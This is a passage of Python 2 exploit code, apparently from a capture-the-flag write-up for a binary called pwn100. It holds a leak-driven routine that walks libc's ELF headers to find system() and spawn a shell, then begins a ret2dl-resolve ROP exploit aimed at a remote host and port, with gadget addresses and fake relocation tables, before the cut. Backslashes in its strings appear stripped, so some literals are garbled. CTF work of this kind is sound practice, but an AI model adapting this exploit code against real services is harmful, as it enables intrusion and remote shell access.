                if ch == 'n':
                    buf += 'x00'
                    break
                else:
                    buf += ch[0]
        leak_data = buf[:size]
        #print '{} ==> {}'.format(hex(address), leak_data.encode('hex'))
        return leak_data
    # manual leak libc
    BITS = 64
    # get arbitrary address located in libc
    def get_elf_entry(got):
        entry = l64(leak(got, 0x8))
        print '[+] libc entrytttt:t0x%x' % entry
        return entry
    # find libc base according to Magic
    def find_elf_base(entry):
        if BITS == 64:
            libc_base = entry & 0xfffffffffffff000
            while True:
                garbage = leak(libc_base, 0x4)
                if garbage == 'x7fELF':
                    break
                libc_base -= 0x1000
            print '[+] libc basetttt:t0x%x' % libc_base
            return libc_base
    # find program header table
    def find_phdr(elf_base):
        if BITS == 64:
            # get address of program header table
            phdr = l64(leak(elf_base + 0x20, 0x8)) + elf_base
            print '[+] program headers tablett:t0x%x' % phdr
            return phdr
    # find dynamic section table (.dynamic section -> DYNAMIC segment)
    def find_dyn_section(phdr, elf_base):
        if BITS == 64:
            phdr_ent = phdr
            while True:
                garbage = l32(leak(phdr_ent, 0x4))
                # p_type of dynamic segment is 0x2
                if garbage == 0x2:
                    break
                phdr_ent += 0x38
            dyn_section = l64(leak(phdr_ent + 0x10, 0x8)) + elf_base
            print '[+] .dynamic section headers tablet:t0x%x' % dyn_section
            return dyn_section
    def find_sym_str_table(dyn_section):
        if BITS == 64:
            dyn_ent = dyn_section
            dt_sym_tab = 0x0
            dt_str_tab = 0x0
            while True:
                garbage = l64(leak(dyn_ent, 0x8))
                if garbage == 0x6:
                    dt_sym_tab = l64(leak(dyn_ent + 0x8, 0x8))
                elif garbage == 0x5:
                    dt_str_tab = l64(leak(dyn_ent + 0x8, 0x8))
                if dt_str_tab and dt_sym_tab:
                    break
                dyn_ent += 0x10
            print '[+] symtabtttt:t0x%x' % dt_sym_tab
            print '[+] strtabtttt:t0x%x' % dt_str_tab
            return (dt_sym_tab, dt_str_tab)
    def find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base):
        if BITS == 64:
            sym_ent = dt_sym_tab
            while True:
                garbage = l32(leak(sym_ent, 0x4))
                name    = leak(dt_str_tab + garbage, len(func))
                if name == func:
                    break
                sym_ent += 0x18
            adr_func = l64(leak(sym_ent + 0x8, 0x8)) + elf_base
            print '[+] %s loaded addresst:t0x%x' % (func, adr_func)
            return adr_func
    # exploit ELF
    def lookup(func):
        entry                   = get_elf_entry(got_read)
        elf_base                = find_elf_base(entry)
        phdr                    = find_phdr(elf_base)
        dyn_section             = find_dyn_section(phdr, elf_base)
        dt_sym_tab, dt_str_tab  = find_sym_str_table(dyn_section)
        func_address            = find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base)
        return func_address
    leak(got_read, 0x8)
    adr_system = lookup('__libc_system')
    print '[+] system addrt:t' + hex(adr_system)
    getshell(adr_system)
    io.itr()
**ret2dl-resolve**
    from zio import *
    io  = zio(('119.28.63.211', 2332), print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'blue'), timeout = 100000)
    # io  = zio('./pwn100_strip', print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'blue'), timeout = 100000)
    # io = zio(('119.28.63.211', 2332), print_read = False, print_write = False, timeout = 10000)
    #io.hint([0x4006b7])
    junk        = 0x48
    plt_puts    = 0x0000000000400500
    plt_resolve = 0x00000000004004f0
    got_read    = 0x0000000000601028
    got_puts    = 0x0000000000601018
    got_linkmap = 0x0000000000601008
    leave_ret   = 0x000000000040068c
    pop_rbp_ret = 0x0000000000400595
    pop_rdi_ret = 0x0000000000400763
    p4_ret      = 0x000000000040075c
    adr_stage   = 0x0000000000601000 + 0x800
    adr_rel_plt         = 0x0000000000400450
    adr_dyn_sym         = 0x00000000004002c0
    adr_dyn_str         = 0x0000000000400380
    adr_fake_rel_plt    = adr_stage + 0x100
    adr_fake_dyn_sym    = adr_stage + 0x208
    adr_fake_dyn_str    = adr_stage + 0x300
    adr_shell           = adr_stage + 0x400
    com_part1           = 0x40075a
    com_part2           = 0x400740
    adr_entry           = 0x400550
    def prepare(address):
        payload0  = 'A' * junk